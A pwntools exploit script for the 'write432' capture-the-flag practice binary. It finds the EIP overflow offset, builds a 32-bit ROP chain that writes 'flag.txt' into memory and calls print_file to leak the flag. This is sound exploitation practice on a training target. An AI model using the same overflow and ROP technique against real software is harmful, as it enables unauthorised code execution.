from pwn import *
import warnings
warnings.filterwarnings("ignore")

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] +argv, *a, **kw)

gdbscript = '''
init-pwndbg
continue
'''.format(**locals())

exe = './write432'
elf = context.binary = ELF(exe, checksec=False)
context.log_level = 'info'
context.delete_corefiles = True

# Exploit starts here :)

io = start()
payload = cyclic(100)
io.sendlineafter('>', payload)
io.wait()

core = io.corefile
eip = core.eip
eip_offset = cyclic_find(eip)
info("Located EIP offset at {offset}".format(offset=eip_offset))

rop = ROP("./write432")
pop_edi_ebp_ret = rop.find_gadget(["pop edi", "pop ebp", "ret"])[0]
mov_edi_ebp_ret = elf.symbols.usefulGadgets
_data = elf.symbols.data_start
_data_next = elf.symbols.data_start + 0x4
print_file = elf.symbols.print_file

rop.raw([pop_edi_ebp_ret, _data, "flag", mov_edi_ebp_ret])
rop.raw([pop_edi_ebp_ret, _data_next, ".txt", mov_edi_ebp_ret])
rop.print_file(_data)
rop.chain()

payload = fit({
	eip_offset: rop
})

p = process()
p.sendlineafter('>', payload)
p.interactive()

"""
io = start()
io.sendline(payload)
io.recv()

flag = io.recvline()
success(flag)
"""

